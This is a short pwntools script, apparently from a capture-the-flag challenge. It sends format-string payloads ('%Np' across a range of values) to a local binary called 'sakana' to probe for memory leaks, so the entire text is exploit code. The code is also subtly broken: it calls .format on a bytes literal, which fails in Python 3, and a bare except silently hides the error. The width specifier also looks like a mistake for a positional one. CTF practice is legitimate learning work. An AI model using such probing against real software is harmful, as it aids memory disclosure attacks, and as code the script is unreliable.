from pwn import *
#automatically get context arch
elf=context.binary=ELF('pwn/sakana/sakana',checksec=False)

for i in range(264,264+100):
    try:
       
        #level used to reduce noise
        p=process(level='error')
        #p.sendlineafter(b'~>',b'printf')
        p.sendline(b'printf')
        p.sendline(b'%{}p'.format(i).encode())
        sleep(0.01)
      
        result= p.recvline()
        print(str(i)+': '+str(result).strip())
    except:
        pass